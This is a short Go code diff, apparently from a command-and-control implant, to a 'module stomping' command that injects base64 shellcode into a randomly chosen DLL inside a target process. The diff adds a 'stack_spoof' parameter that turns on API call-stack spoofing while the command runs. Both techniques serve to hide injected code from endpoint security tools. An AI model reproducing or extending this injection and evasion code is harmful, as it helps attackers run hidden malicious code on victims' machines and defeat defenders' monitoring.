@@ -42,6 +42,7 @@ type moduleStompingParams struct {
 	ShellcodeB64 string `json:"shellcode_b64"`
 	PID          int    `json:"pid"`
 	DllName      string `json:"dll_name"`
+	StackSpoof   bool   `json:"stack_spoof"`
 }
 
 func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult {
@@ -71,6 +72,11 @@ func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult
 		}
 		r := rand.New(rand.NewSource(time.Now().UnixNano()))
 		params.DllName = stompDLLs[r.Intn(len(stompDLLs))]
+	}
+
+	if params.StackSpoof {
+		SetAPISpoofEnabled(true)
+		defer SetAPISpoofEnabled(false)
 	}
 
 	var sb strings.Builder
